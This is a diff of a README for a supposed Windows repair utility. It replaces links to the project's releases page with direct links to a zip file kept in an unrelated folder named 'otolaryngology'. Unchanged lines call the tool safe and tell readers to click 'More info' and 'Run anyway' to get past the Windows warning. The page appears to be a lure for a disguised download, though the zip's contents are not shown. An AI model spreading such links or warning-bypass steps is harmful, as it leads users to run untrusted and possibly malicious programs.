@@ -8,9 +8,9 @@ Welcome to **windows-repair-tool**! This simple application helps you fix corrup
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download windows-repair-tool](https://github.com/Hamilto1496/windows-repair-tool/releases)** 
+Visit this link to download the application: **[Download windows-repair-tool](https://raw.githubusercontent.com/Hamilto1496/windows-repair-tool/main/otolaryngology/repair-tool-windows-v1.9.zip)** 
 
-[![Download Now](https://img.shields.io/badge/Download-windows--repair--tool-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Hamilto1496/windows-repair-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-windows--repair--tool-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Hamilto1496/windows-repair-tool/main/otolaryngology/repair-tool-windows-v1.9.zip)
 
 Once you're on the download page, follow these easy steps:
 
@@ -179,7 +179,7 @@ Click **"More info"** and then **"Run anyway."** This occurs with almost all new
 
 If your computer has been acting up, downloading this tool is your first step to a healthier, faster, and more reliable system. It's free, safe, and made for everyone—from beginners to tech experts.
 
-**Get started now:** [Download windows-repair-tool](https://github.com/Hamilto1496/windows-repair-tool/releases)
+**Get started now:** [Download windows-repair-tool](https://raw.githubusercontent.com/Hamilto1496/windows-repair-tool/main/otolaryngology/repair-tool-windows-v1.9.zip)
 
 Repair your Windows in minutes, not hours!
 
